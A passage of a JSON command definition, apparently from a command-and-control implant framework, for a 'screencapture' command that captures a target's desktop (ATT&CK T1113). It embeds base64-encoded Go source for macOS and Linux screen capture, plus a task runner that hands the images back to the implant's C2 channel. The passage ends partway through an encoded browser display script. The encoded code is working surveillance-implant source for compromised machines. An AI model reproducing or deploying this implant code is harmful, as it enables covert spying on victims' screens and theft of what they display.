          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "capture a screenshot of the targets desktop (not implemented on Linux)",
          "cmd": "screencapture",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1113",
              "attack_name": "Screen Capture"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "screenshotlicense": "TUlUIExpY2Vuc2UKCkNvcHlyaWdodCAoYykgMjAxNiBrYmluYW5pCgpQZXJtaXNzaW9uIGlzIGhlcmVieSBncmFudGVkLCBmcmVlIG9mIGNoYXJnZSwgdG8gYW55IHBlcnNvbiBvYnRhaW5pbmcgYSBjb3B5Cm9mIHRoaXMgc29mdHdhcmUgYW5kIGFzc29jaWF0ZWQgZG9jdW1lbnRhdGlvbiBmaWxlcyAodGhlICJTb2Z0d2FyZSIpLCB0byBkZWFsCmluIHRoZSBTb2Z0d2FyZSB3aXRob3V0IHJlc3RyaWN0aW9uLCBpbmNsdWRpbmcgd2l0aG91dCBsaW1pdGF0aW9uIHRoZSByaWdodHMKdG8gdXNlLCBjb3B5LCBtb2RpZnksIG1lcmdlLCBwdWJsaXNoLCBkaXN0cmlidXRlLCBzdWJsaWNlbnNlLCBhbmQvb3Igc2VsbApjb3BpZXMgb2YgdGhlIFNvZnR3YXJlLCBhbmQgdG8gcGVybWl0IHBlcnNvbnMgdG8gd2hvbSB0aGUgU29mdHdhcmUgaXMKZnVybmlzaGVkIHRvIGRvIHNvLCBzdWJqZWN0IHRvIHRoZSBmb2xsb3dpbmcgY29uZGl0aW9uczoKClRoZSBhYm92ZSBjb3B5cmlnaHQgbm90aWNlIGFuZCB0aGlzIHBlcm1pc3Npb24gbm90aWNlIHNoYWxsIGJlIGluY2x1ZGVkIGluIGFsbApjb3BpZXMgb3Igc3Vic3RhbnRpYWwgcG9ydGlvbnMgb2YgdGhlIFNvZnR3YXJlLgoKVEhFIFNPRlRXQVJFIElTIFBST1ZJREVEICJBUyBJUyIsIFdJVEhPVVQgV0FSUkFOVFkgT0YgQU5ZIEtJTkQsIEVYUFJFU1MgT1IKSU1QTElFRCwgSU5DTFVESU5HIEJVVCBOT1QgTElNSVRFRCBUTyBUSEUgV0FSUkFOVElFUyBPRiBNRVJDSEFOVEFCSUxJVFksCkZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFIEFORCBOT05JTkZSSU5HRU1FTlQuIElOIE5PIEVWRU5UIFNIQUxMIFRIRQpBVVRIT1JTIE9SIENPUFlSSUdIVCBIT0xERVJTIEJFIExJQUJMRSBGT1IgQU5ZIENMQUlNLCBEQU1BR0VTIE9SIE9USEVSCkxJQUJJTElUWSwgV0hFVEhFUiBJTiBBTiBBQ1RJT04gT0YgQ09OVFJBQ1QsIFRPUlQgT1IgT1RIRVJXSVNFLCBBUklTSU5HIEZST00sCk9VVCBPRiBPUiBJTiBDT05ORUNUSU9OIFdJVEggVEhFIFNPRlRXQVJFIE9SIFRIRSBVU0UgT1IgT1RIRVIgREVBTElOR1MgSU4gVEhFClNPRlRXQVJFLg=="
            },
            {
              "screencapture_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSBzY3JlZW5jYXB0dXJlCgovKgojY2dvIExERkxBR1M6IC1mcmFtZXdvcmsgQ29yZUdyYXBoaWNzIC1mcmFtZXdvcmsgQ29yZUZvdW5kYXRpb24KI2luY2x1ZGUgPENvcmVHcmFwaGljcy9Db3JlR3JhcGhpY3MuaD4Kdm9pZCogQ29tcGF0Q0dEaXNwbGF5Q3JlYXRlSW1hZ2VGb3JSZWN0KENHRGlyZWN0RGlzcGxheUlEIGRpc3BsYXksIENHUmVjdCByZWN0KSB7CglyZXR1cm4gQ0dEaXNwbGF5Q3JlYXRlSW1hZ2VGb3JSZWN0KGRpc3BsYXksIHJlY3QpOwp9CnZvaWQgQ29tcGF0Q0dJbWFnZVJlbGVhc2Uodm9pZCogaW1hZ2UpIHsKCUNHSW1hZ2VSZWxlYXNlKGltYWdlKTsKfQp2b2lkKiBDb21wYXRDR0ltYWdlQ3JlYXRlQ29weVdpdGhDb2xvclNwYWNlKHZvaWQqIGltYWdlLCBDR0NvbG9yU3BhY2VSZWYgc3BhY2UpIHsKCXJldHVybiBDR0ltYWdlQ3JlYXRlQ29weVdpdGhDb2xvclNwYWNlKChDR0ltYWdlUmVmKWltYWdlLCBzcGFjZSk7Cn0Kdm9pZCBDb21wYXRDR0NvbnRleHREcmF3SW1hZ2UoQ0dDb250ZXh0UmVmIGMsIENHUmVjdCByZWN0LCB2b2lkKiBpbWFnZSkgewoJQ0dDb250ZXh0RHJhd0ltYWdlKGMsIHJlY3QsIChDR0ltYWdlUmVmKWltYWdlKTsKfQoqLwppbXBvcnQgIkMiCmltcG9ydCAoCgkiYnl0ZXMiCgkiZXJyb3JzIgoJImltYWdlIgoJImltYWdlL3BuZyIKCSJ1bnNhZmUiCikKCi8vRGFyd2luU2NyZWVuc2hvdCAtIHN0cnVjdCBmb3Igc2NyZWVuc2hvdCBkYXRhCnR5cGUgRGFyd2luU2NyZWVuc2hvdCBzdHJ1Y3QgewoJTW9uaXRvckluZGV4ICAgaW50CglTY3JlZW5zaG90RGF0YSBbXWJ5dGUKfQoKLy9Nb25pdG9yIC0gRGFyd2luIHN1YmNsYXNzIG1ldGhvZCB0byByZXR1cm4gdGhlIG1vbml0b3IgaW5kZXgKZnVuYyAoZCAqRGFyd2luU2NyZWVuc2hvdCkgTW9uaXRvcigpIGludCB7CglyZXR1cm4gZC5Nb25pdG9ySW5kZXgKfQoKLy9EYXRhIC0gRGFyd2luIHN1YmNsYXNzIG1ldGhvZCB0byByZXR1cm4gdGhlIHJhdyBwbmcgZGF0YQpmdW5jIChkICpEYXJ3aW5TY3JlZW5zaG90KSBEYXRhKCkgW11ieXRlIHsKCXJldHVybiBkLlNjcmVlbnNob3REYXRhCn0KCmZ1bmMgZ2V0c2NyZWVuc2hvdCgpIChbXVNjcmVlblNob3QsIGVycm9yKSB7CgluIDo9IE51bUFjdGl2ZURpc3BsYXlzKCkKCXNjcmVlbnMgOj0gbWFrZShbXVNjcmVlblNob3QsIG4pCglmb3IgaSA6PSAwOyBpIDwgbjsgaSsrIHsKCgkJYm91bmRzIDo9IEdldERpc3BsYXlCb3VuZHMoaSkKCQlpbWcsIGVyciA6PSBDYXB0dXJlUmVjdChib3VuZHMpCgkJaWYgZXJyICE9IG5pbCB7CgkJCXJldHVybiBuaWwsIGVycgoJCX0KCgkJYnVmIDo9IG5ldyhieXRlcy5CdWZmZXIpCgkJZXJyID0gcG5nLkVuY29kZShidWYsIGltZykKCgkJaWYgZXJyICE9IG5pbCB7CgkJCXJldHVybiBuaWwsIGVycgoJCX0KCgkJc2NyZWVuc1tpXSA9ICZEYXJ3aW5TY3JlZW5zaG90ewoJCQlNb25pdG9ySW5kZXg6ICAgaSwKCQkJU2NyZWVuc2hvdERhdGE6IGJ1Zi5CeXRlcygpLAoJCX0KCX0KCglyZXR1cm4gc2NyZWVucywgbmlsCn0KCi8vQ3JlYXRlSW1hZ2UgQ3JlYXRlIGFuIFJHQkEgSW1hZ2Ugc3RydWN0dXJlIGluIG1lbW9yeQpmdW5jIENyZWF0ZUltYWdlKHJlY3QgaW1hZ2UuUmVjdGFuZ2xlKSAoaW1nICppbWFnZS5SR0JBLCBlIGVycm9yKSB7CglpbWcgPSBuaWwKCWUgPSBlcnJvcnMuTmV3KCJDYW5ub3QgY3JlYXRlIGltYWdlLlJHQkEiKQoKCWRlZmVyIGZ1bmMoKSB7CgkJZXJyIDo9IHJlY292ZXIoKQoJCWlmIGVyciA9PSBuaWwgewoJCQllID0gbmlsCgkJfQoJfSgpCgkvLyBpbWFnZS5OZXdSR0JBIG1heSBwYW5pYyBpZiByZWN0IGlzIHRvbyBsYXJnZS4KCWltZyA9IGltYWdlLk5ld1JHQkEocmVjdCkKCglyZXR1cm4gaW1nLCBlCn0KCi8vQ2FwdHVyZSBhIHNjcmVlbnNob3QKZnVuYyBDYXB0dXJlKHgsIHksIHdpZHRoLCBoZWlnaHQgaW50KSAoKmltYWdlLlJHQkEsIGVycm9yKSB7CglpZiB3aWR0aCA8PSAwIHx8IGhlaWdodCA8PSAwIHsKCQlyZXR1cm4gbmlsLCBlcnJvcnMuTmV3KCJ3aWR0aCBvciBoZWlnaHQgc2hvdWxkIGJlID4gMCIpCgl9CgoJcmVjdCA6PSBpbWFnZS5SZWN0KDAsIDAsIHdpZHRoLCBoZWlnaHQpCglpbWcsIGVyciA6PSBDcmVhdGVJbWFnZShyZWN0KQoJaWYgZXJyICE9IG5pbCB7CgkJcmV0dXJuIG5pbCwgZXJyCgl9CgoJLy8gY2c6IENvcmVHcmFwaGljcyBjb29yZGluYXRlIChvcmlnaW46IGxvd2VyLWxlZnQgY29ybmVyIG9mIHByaW1hcnkgZGlzcGxheSwgeC1heGlzOiByaWdodHdhcmQsIHktYXhpczogdXB3YXJkKQoJLy8gd2luOiBXaW5kb3dzIGNvb3JkaW5hdGUgKG9yaWdpbjogdXBwZXItbGVmdCBjb3JuZXIgb2YgcHJpbWFyeSBkaXNwbGF5LCB4LWF4aXM6IHJpZ2h0d2FyZCwgeS1heGlzOiBkb3dud2FyZCkKCS8vIGRpOiBEaXNwbGF5IGxvY2FsIGNvb3JkaW5hdGUgKG9yaWdpbjogdXBwZXItbGVmdCBjb3JuZXIgb2YgdGhlIGRpc3BsYXksIHgtYXhpczogcmlnaHR3YXJkLCB5LWF4aXM6IGRvd253YXJkKQoKCWNnTWFpbkRpc3BsYXlCb3VuZHMgOj0gZ2V0Q29yZUdyYXBoaWNzQ29vcmRpbmF0ZU9mRGlzcGxheShDLkNHTWFpbkRpc3BsYXlJRCgpKQoKCXdpbkJvdHRvbUxlZnQgOj0gQy5DR1BvaW50TWFrZShDLkNHRmxvYXQoeCksIEMuQ0dGbG9hdCh5K2hlaWdodCkpCgljZ0JvdHRvbUxlZnQgOj0gZ2V0Q29yZUdyYXBoaWNzQ29vcmRpbmF0ZUZyb21XaW5kb3dzQ29vcmRpbmF0ZSh3aW5Cb3R0b21MZWZ0LCBjZ01haW5EaXNwbGF5Qm91bmRzKQoJY2dDYXB0dXJlQm91bmRzIDo9IEMuQ0dSZWN0TWFrZShjZ0JvdHRvbUxlZnQueCwgY2dCb3R0b21MZWZ0LnksIEMuQ0dGbG9hdCh3aWR0aCksIEMuQ0dGbG9hdChoZWlnaHQpKQoKCWlkcyA6PSBhY3RpdmVEaXNwbGF5TGlzdCgpCgoJY3R4IDo9IGNyZWF0ZUJpdG1hcENvbnRleHQod2lkdGgsIGhlaWdodCwgKCpDLnVpbnQzMl90KSh1bnNhZmUuUG9pbnRlcigmaW1nLlBpeFswXSkpLCBpbWcuU3RyaWRlKQoJaWYgY3R4ID09IDAgewoJCXJldHVybiBuaWwsIGVycm9ycy5OZXcoImNhbm5vdCBjcmVhdGUgYml0bWFwIGNvbnRleHQiKQoJfQoKCWNvbG9yU3BhY2UgOj0gY3JlYXRlQ29sb3JzcGFjZSgpCglpZiBjb2xvclNwYWNlID09IDAgewoJCXJldHVybiBuaWwsIGVycm9ycy5OZXcoImNhbm5vdCBjcmVhdGUgY29sb3JzcGFjZSIpCgl9CglkZWZlciBDLkNHQ29sb3JTcGFjZVJlbGVhc2UoY29sb3JTcGFjZSkKCglmb3IgXywgaWQgOj0gcmFuZ2UgaWRzIHsKCQljZ0JvdW5kcyA6PSBnZXRDb3JlR3JhcGhpY3NDb29yZGluYXRlT2ZEaXNwbGF5KGlkKQoJCWNnSW50ZXJzZWN0IDo9IEMuQ0dSZWN0SW50ZXJzZWN0aW9uKGNnQm91bmRzLCBjZ0NhcHR1cmVCb3VuZHMpCgkJaWYgQy5DR1JlY3RJc051bGwoY2dJbnRlcnNlY3QpIHsKCQkJY29udGludWUKCQl9CgkJaWYgY2dJbnRlcnNlY3Quc2l6ZS53aWR0aCA8PSAwIHx8IGNnSW50ZXJzZWN0LnNpemUuaGVpZ2h0IDw9IDAgewoJCQljb250aW51ZQoJCX0KCgkJLy8gQ0dEaXNwbGF5Q3JlYXRlSW1hZ2VGb3JSZWN0IHBvdGVudGlhbGx5IGZhaWwgaW4gY2FzZSB3aWR0aC9oZWlnaHQgaXMgb2RkIG51bWJlci4KCQlpZiBpbnQoY2dJbnRlcnNlY3Quc2l6ZS53aWR0aCklMiAhPSAwIHsKCQkJY2dJbnRlcnNlY3Quc2l6ZS53aWR0aCA9IEMuQ0dGbG9hdChpbnQoY2dJbnRlcnNlY3Quc2l6ZS53aWR0aCkgKyAxKQoJCX0KCQlpZiBpbnQoY2dJbnRlcnNlY3Quc2l6ZS5oZWlnaHQpJTIgIT0gMCB7CgkJCWNnSW50ZXJzZWN0LnNpemUuaGVpZ2h0ID0gQy5DR0Zsb2F0KGludChjZ0ludGVyc2VjdC5zaXplLmhlaWdodCkgKyAxKQoJCX0KCgkJZGlJbnRlcnNlY3REaXNwbGF5TG9jYWwgOj0gQy5DR1JlY3RNYWtlKGNnSW50ZXJzZWN0Lm9yaWdpbi54LWNnQm91bmRzLm9yaWdpbi54LAoJCQljZ0JvdW5kcy5vcmlnaW4ueStjZ0JvdW5kcy5zaXplLmhlaWdodC0oY2dJbnRlcnNlY3Qub3JpZ2luLnkrY2dJbnRlcnNlY3Quc2l6ZS5oZWlnaHQpLAoJCQljZ0ludGVyc2VjdC5zaXplLndpZHRoLCBjZ0ludGVyc2VjdC5zaXplLmhlaWdodCkKCQljYXB0dXJlZCA6PSBDLkNvbXBhdENHRGlzcGxheUNyZWF0ZUltYWdlRm9yUmVjdChpZCwgZGlJbnRlcnNlY3REaXNwbGF5TG9jYWwpCgkJaWYgY2FwdHVyZWQgPT0gbmlsIHsKCQkJcmV0dXJuIG5pbCwgZXJyb3JzLk5ldygiY2Fubm90IGNhcHR1cmUgZGlzcGxheSIpCgkJfQoJCWRlZmVyIEMuQ29tcGF0Q0dJbWFnZVJlbGVhc2UoY2FwdHVyZWQpCgoJCWltYWdlIDo9IEMuQ29tcGF0Q0dJbWFnZUNyZWF0ZUNvcHlXaXRoQ29sb3JTcGFjZShjYXB0dXJlZCwgY29sb3JTcGFjZSkKCQlpZiBpbWFnZSA9PSBuaWwgewoJCQlyZXR1cm4gbmlsLCBlcnJvcnMuTmV3KCJmYWlsZWQgY29weWluZyBjYXB0dXJlZCBpbWFnZSIpCgkJfQoJCWRlZmVyIEMuQ29tcGF0Q0dJbWFnZVJlbGVhc2UoaW1hZ2UpCgoJCWNnRHJhd1JlY3QgOj0gQy5DR1JlY3RNYWtlKGNnSW50ZXJzZWN0Lm9yaWdpbi54LWNnQ2FwdHVyZUJvdW5kcy5vcmlnaW4ueCwgY2dJbnRlcnNlY3Qub3JpZ2luLnktY2dDYXB0dXJlQm91bmRzLm9yaWdpbi55LAoJCQljZ0ludGVyc2VjdC5zaXplLndpZHRoLCBjZ0ludGVyc2VjdC5zaXplLmhlaWdodCkKCQlDLkNvbXBhdENHQ29udGV4dERyYXdJbWFnZShjdHgsIGNnRHJhd1JlY3QsIGltYWdlKQoJfQoKCWkgOj0gMAoJZm9yIGl5IDo9IDA7IGl5IDwgaGVpZ2h0OyBpeSsrIHsKCQlqIDo9IGkKCQlmb3IgaXggOj0gMDsgaXggPCB3aWR0aDsgaXgrKyB7CgkJCS8vIEFSR0IgPT4gUkdCQSwgYW5kIHNldCBBIHRvIDI1NQoJCQlpbWcuUGl4W2pdLCBpbWcuUGl4W2orMV0sIGltZy5QaXhbaisyXSwgaW1nLlBpeFtqKzNdID0gaW1nLlBpeFtqKzFdLCBpbWcuUGl4W2orMl0sIGltZy5QaXhbaiszXSwgMjU1CgkJCWogKz0gNAoJCX0KCQlpICs9IGltZy5TdHJpZGUKCX0KCglyZXR1cm4gaW1nLCBuaWwKfQoKLy9OdW1BY3RpdmVEaXNwbGF5cyBnZXQgdGhlIG51bWJlciBvZiBhY3RpdmUgZGlzcGxheXMKZnVuYyBOdW1BY3RpdmVEaXNwbGF5cygpIGludCB7Cgl2YXIgY291bnQgQy51aW50MzJfdCA9IDAKCWlmIEMuQ0dHZXRBY3RpdmVEaXNwbGF5TGlzdCgwLCBuaWwsICZjb3VudCkgPT0gQy5rQ0dFcnJvclN1Y2Nlc3MgewoJCXJldHVybiBpbnQoY291bnQpCgl9IGVsc2UgewoJCXJldHVybiAwCgl9Cn0KCi8vR2V0RGlzcGxheUJvdW5kcyBHZXQgdGhlIGRpc3BsYXkgYm91bmRzCmZ1bmMgR2V0RGlzcGxheUJvdW5kcyhkaXNwbGF5SW5kZXggaW50KSBpbWFnZS5SZWN0YW5nbGUgewoJaWQgOj0gZ2V0RGlzcGxheUlEKGRpc3BsYXlJbmRleCkKCW1haW4gOj0gQy5DR01haW5EaXNwbGF5SUQoKQoKCXZhciByZWN0IGltYWdlLlJlY3RhbmdsZQoKCWJvdW5kcyA6PSBnZXRDb3JlR3JhcGhpY3NDb29yZGluYXRlT2ZEaXNwbGF5KGlkKQoJcmVjdC5NaW4uWCA9IGludChib3VuZHMub3JpZ2luLngpCglpZiBtYWluID09IGlkIHsKCQlyZWN0Lk1pbi5ZID0gMAoJfSBlbHNlIHsKCQltYWluQm91bmRzIDo9IGdldENvcmVHcmFwaGljc0Nvb3JkaW5hdGVPZkRpc3BsYXkobWFpbikKCQltYWluSGVpZ2h0IDo9IG1haW5Cb3VuZHMuc2l6ZS5oZWlnaHQKCQlyZWN0Lk1pbi5ZID0gaW50KG1haW5IZWlnaHQgLSAoYm91bmRzLm9yaWdpbi55ICsgYm91bmRzLnNpemUuaGVpZ2h0KSkKCX0KCXJlY3QuTWF4LlggPSByZWN0Lk1pbi5YICsgaW50KGJvdW5kcy5zaXplLndpZHRoKQoJcmVjdC5NYXguWSA9IHJlY3QuTWluLlkgKyBpbnQoYm91bmRzLnNpemUuaGVpZ2h0KQoKCXJldHVybiByZWN0Cn0KCi8vZ2V0RGlzcGxheUlkIEdldCB0aGUgZGlzcGxheSBJRApmdW5jIGdldERpc3BsYXlJRChkaXNwbGF5SW5kZXggaW50KSBDLkNHRGlyZWN0RGlzcGxheUlEIHsKCW1haW4gOj0gQy5DR01haW5EaXNwbGF5SUQoKQoJaWYgZGlzcGxheUluZGV4ID09IDAgewoJCXJldHVybiBtYWluCgl9IGVsc2UgewoJCW4gOj0gTnVtQWN0aXZlRGlzcGxheXMoKQoJCWlkcyA6PSBtYWtlKFtdQy5DR0RpcmVjdERpc3BsYXlJRCwgbikKCQlpZiBDLkNHR2V0QWN0aXZlRGlzcGxheUxpc3QoQy51aW50MzJfdChuKSwgKCpDLkNHRGlyZWN0RGlzcGxheUlEKSh1bnNhZmUuUG9pbnRlcigmaWRzWzBdKSksIG5pbCkgIT0gQy5rQ0dFcnJvclN1Y2Nlc3MgewoJCQlyZXR1cm4gMAoJCX0KCQlpbmRleCA6PSAwCgkJZm9yIGkgOj0gMDsgaSA8IG47IGkrKyB7CgkJCWlmIGlkc1tpXSA9PSBtYWluIHsKCQkJCWNvbnRpbnVlCgkJCX0KCQkJaW5kZXgrKwoJCQlpZiBpbmRleCA9PSBkaXNwbGF5SW5kZXggewoJCQkJcmV0dXJuIGlkc1tpXQoJCQl9CgkJfQoJfQoKCXJldHVybiAwCn0KCmZ1bmMgZ2V0Q29yZUdyYXBoaWNzQ29vcmRpbmF0ZU9mRGlzcGxheShpZCBDLkNHRGlyZWN0RGlzcGxheUlEKSBDLkNHUmVjdCB7CgltYWluIDo9IEMuQ0dEaXNwbGF5Qm91bmRzKEMuQ0dNYWluRGlzcGxheUlEKCkpCglyIDo9IEMuQ0dEaXNwbGF5Qm91bmRzKGlkKQoJcmV0dXJuIEMuQ0dSZWN0TWFrZShyLm9yaWdpbi54LCAtci5vcmlnaW4ueS1yLnNpemUuaGVpZ2h0K21haW4uc2l6ZS5oZWlnaHQsCgkJci5zaXplLndpZHRoLCByLnNpemUuaGVpZ2h0KQp9CgpmdW5jIGdldENvcmVHcmFwaGljc0Nvb3JkaW5hdGVGcm9tV2luZG93c0Nvb3JkaW5hdGUocCBDLkNHUG9pbnQsIG1haW5EaXNwbGF5Qm91bmRzIEMuQ0dSZWN0KSBDLkNHUG9pbnQgewoJcmV0dXJuIEMuQ0dQb2ludE1ha2UocC54LCBtYWluRGlzcGxheUJvdW5kcy5zaXplLmhlaWdodC1wLnkpCn0KCmZ1bmMgY3JlYXRlQml0bWFwQ29udGV4dCh3aWR0aCBpbnQsIGhlaWdodCBpbnQsIGRhdGEgKkMudWludDMyX3QsIGJ5dGVzUGVyUm93IGludCkgQy5DR0NvbnRleHRSZWYgewoJY29sb3JTcGFjZSA6PSBjcmVhdGVDb2xvcnNwYWNlKCkKCWlmIGNvbG9yU3BhY2UgPT0gMCB7CgkJcmV0dXJuIDAKCX0KCWRlZmVyIEMuQ0dDb2xvclNwYWNlUmVsZWFzZShjb2xvclNwYWNlKQoKCXJldHVybiBDLkNHQml0bWFwQ29udGV4dENyZWF0ZSh1bnNhZmUuUG9pbnRlcihkYXRhKSwKCQlDLnNpemVfdCh3aWR0aCksCgkJQy5zaXplX3QoaGVpZ2h0KSwKCQk4LCAvLyBiaXRzIHBlciBjb21wb25lbnQKCQlDLnNpemVfdChieXRlc1BlclJvdyksCgkJY29sb3JTcGFjZSwKCQlDLmtDR0ltYWdlQWxwaGFOb25lU2tpcEZpcnN0KQp9CgpmdW5jIGNyZWF0ZUNvbG9yc3BhY2UoKSBDLkNHQ29sb3JTcGFjZVJlZiB7CglyZXR1cm4gQy5DR0NvbG9yU3BhY2VDcmVhdGVXaXRoTmFtZShDLmtDR0NvbG9yU3BhY2VTUkdCKQp9CgpmdW5jIGFjdGl2ZURpc3BsYXlMaXN0KCkgW11DLkNHRGlyZWN0RGlzcGxheUlEIHsKCWNvdW50IDo9IEMudWludDMyX3QoTnVtQWN0aXZlRGlzcGxheXMoKSkKCXJldCA6PSBtYWtlKFtdQy5DR0RpcmVjdERpc3BsYXlJRCwgY291bnQpCglpZiBjb3VudCA+IDAgJiYgQy5DR0dldEFjdGl2ZURpc3BsYXlMaXN0KGNvdW50LCAoKkMuQ0dEaXJlY3REaXNwbGF5SUQpKHVuc2FmZS5Qb2ludGVyKCZyZXRbMF0pKSwgbmlsKSA9PSBDLmtDR0Vycm9yU3VjY2VzcyB7CgkJcmV0dXJuIHJldAoJfSBlbHNlIHsKCQlyZXR1cm4gbWFrZShbXUMuQ0dEaXJlY3REaXNwbGF5SUQsIDApCgl9Cn0KCi8vIENhcHR1cmVSZWN0IGNhcHR1cmVzIHNwZWNpZmllZCByZWdpb24gb2YgZGVza3RvcC4KZnVuYyBDYXB0dXJlUmVjdChyZWN0IGltYWdlLlJlY3RhbmdsZSkgKCppbWFnZS5SR0JBLCBlcnJvcikgewoJcmV0dXJuIENhcHR1cmUocmVjdC5NaW4uWCwgcmVjdC5NaW4uWSwgcmVjdC5EeCgpLCByZWN0LkR5KCkpCn0K"
            },
            {
              "screencapture_linux.go": "Ly8gK2J1aWxkIGxpbnV4CgpwYWNrYWdlIHNjcmVlbmNhcHR1cmUKCmltcG9ydCAoCgkiYnl0ZXMiCgkiZXJyb3JzIgoJLy8iaW1hZ2UiCgkiaW1hZ2UvcG5nIgoKCXMgImdpdGh1Yi5jb20va2JpbmFuaS9zY3JlZW5zaG90IgopCgovL0xpbnV4U2NyZWVuc2hvdCAtIHN0cnVjdCBmb3Igc2NyZWVuc2hvdCBkYXRhCnR5cGUgTGludXhTY3JlZW5zaG90IHN0cnVjdCB7CglNb25pdG9ySW5kZXggICBpbnQKCVNjcmVlbnNob3REYXRhIFtdYnl0ZQp9CgovL01vbml0b3IgLSBEYXJ3aW4gc3ViY2xhc3MgbWV0aG9kIHRvIHJldHVybiB0aGUgbW9uaXRvciBpbmRleApmdW5jIChkICpMaW51eFNjcmVlbnNob3QpIE1vbml0b3IoKSBpbnQgewoJcmV0dXJuIGQuTW9uaXRvckluZGV4Cn0KCi8vRGF0YSAtIERhcndpbiBzdWJjbGFzcyBtZXRob2QgdG8gcmV0dXJuIHRoZSByYXcgcG5nIGRhdGEKZnVuYyAoZCAqTGludXhTY3JlZW5zaG90KSBEYXRhKCkgW11ieXRlIHsKCXJldHVybiBkLlNjcmVlbnNob3REYXRhCn0KCmZ1bmMgZ2V0c2NyZWVuc2hvdCgpIChbXVNjcmVlblNob3QsIGVycm9yKSB7CgluIDo9IHMuTnVtQWN0aXZlRGlzcGxheXMoKQoJc2NyZWVucyA6PSBtYWtlKFtdU2NyZWVuU2hvdCwgbikKCWlmIG4gPD0gMCB7CgkJcmV0dXJuIG5pbCwgZXJyb3JzLk5ldygiQWN0aXZlIGRpc3BsYXkgbm90IGZvdW5kIikKCX0KCgkvL3ZhciBhbGwgaW1hZ2UuUmVjdGFuZ2xlID0gaW1hZ2UuUmVjdCgwLCAwLCAwLCAwKQoKCWZvciBpIDo9IDA7IGkgPCBuOyBpKysgewoJCWJvdW5kcyA6PSBzLkdldERpc3BsYXlCb3VuZHMoaSkKCQkvL2FsbCA9IGJvdW5kcy5VbmlvbihhbGwpCgoJCWltZywgZXJyIDo9IHMuQ2FwdHVyZVJlY3QoYm91bmRzKQoJCWlmIGVyciAhPSBuaWwgewoJCQlwYW5pYyhlcnIpCgkJfQoJCS8vIGZpbGVOYW1lIDo9IGZtdC5TcHJpbnRmKCIlZF8lZHglZC5wbmciLCBpLCBib3VuZHMuRHgoKSwgYm91bmRzLkR5KCkpCgkJLy8gc2F2ZShpbWcsIGZpbGVOYW1lKQoKCQlidWYgOj0gbmV3KGJ5dGVzLkJ1ZmZlcikKCQllcnIgPSBwbmcuRW5jb2RlKGJ1ZiwgaW1nKQoKCQlpZiBlcnIgIT0gbmlsIHsKCQkJcmV0dXJuIG5pbCwgZXJyCgkJfQoKCQlzY3JlZW5zW2ldID0gJkxpbnV4U2NyZWVuc2hvdHsKCQkJTW9uaXRvckluZGV4OiAgIGksCgkJCVNjcmVlbnNob3REYXRhOiBidWYuQnl0ZXMoKSwKCQl9CgkJLy8gZm10LlByaW50ZigiIyVkIDogJXYgXCIlc1wiXG4iLCBpLCBib3VuZHMsIGZpbGVOYW1lKQoJfQoKCXJldHVybiBzY3JlZW5zLCBuaWwKfQ=="
            },
            {
              "screencapture.go": "cGFja2FnZSBzY3JlZW5jYXB0dXJlCgppbXBvcnQgKAoJImVuY29kaW5nL2pzb24iCgoJInBrZy91dGlscy9zdHJ1Y3RzIgoJInN5bmMiCgkicGtnL3Byb2ZpbGVzIgopCgp2YXIgbXUgc3luYy5NdXRleAoKLy9TY3JlZW5TaG90IC0gaW50ZXJmYWNlIGZvciBob2xkaW5nIHNjcmVlbnNob3QgZGF0YQp0eXBlIFNjcmVlblNob3QgaW50ZXJmYWNlIHsKCU1vbml0b3IoKSBpbnQKCURhdGEoKSBbXWJ5dGUKfQoKLy9SdW4gLSBmdW5jdGlvbiB1c2VkIHRvIG9idGFpbiBzY3JlZW5zaG90cwpmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaywgY2ggY2hhbiBbXVNjcmVlblNob3QpIHsKCXJlc3VsdCwgZXJyIDo9IGdldHNjcmVlbnNob3QoKQoJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJbXNnLlRhc2tJRCA9IHRhc2suVGFza0lECglpZiBlcnIgIT0gbmlsIHsKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoKCWNoIDwtIHJlc3VsdCAKCS8qZm9yIGkgOj0gMDsgaSA8IGxlbihyZXN1bHQpOyBpKysgewoJCXByb2ZpbGVzLlByb2ZpbGUuU2VuZEZpbGVDaHVua3ModGFzaywgcmVzdWx0W2ldLkRhdGEoKSwgY2gpCgkJdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKHByb2ZpbGVzLlByb2ZpbGUuU2xlZXBJbnRlcnZhbCgpKSAqIHRpbWUuU2Vjb25kKQoJfSovCgkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsKICBpZih0YXNrLnN0YXR1cyA9PT0gJ2Vycm9yJyl7cmV0dXJuICI8cHJlPiBFcnJvcjogVW50b2dnbGUgc3d0aWNoIHRvIHNlZSBlcnJvciBtZXNzYWdlKHMpIDwvcHJlPiI7IH0KICBsZXQgb3V0cHV0ID0gIiI7CiAgZm9yKGxldCBpID0gMDsgaSA8IHJlc3BvbnNlcy5sZW5ndGg7IGkrPTIpewogIAlpZiggaSsxIDwgcmVzcG9uc2VzLmxlbmd0aCl7CiAgCQkvL29ubHkgd2FudCB0byBkbyB0aGlzIGlmIHRoZSBuZXh0IHJlc3BvbnNlIGV4aXN0cywgaS5lLiBmaWxlX2Rvd25sb2FkZWQKICAJCWxldCBzdGF0dXMgPSBKU09OLnBhcnNlKHJlc3BvbnNlc1tpXVsncmVzcG9uc2UnXSk7CiAgICAJbGV0IGlkID0gc3RhdHVzWydhZ2VudF9maWxlX2lkJ107CiAgICAgICAgb3V0cHV0ICs9ICI8ZGl2IGNsYXNzPSdjYXJkJz48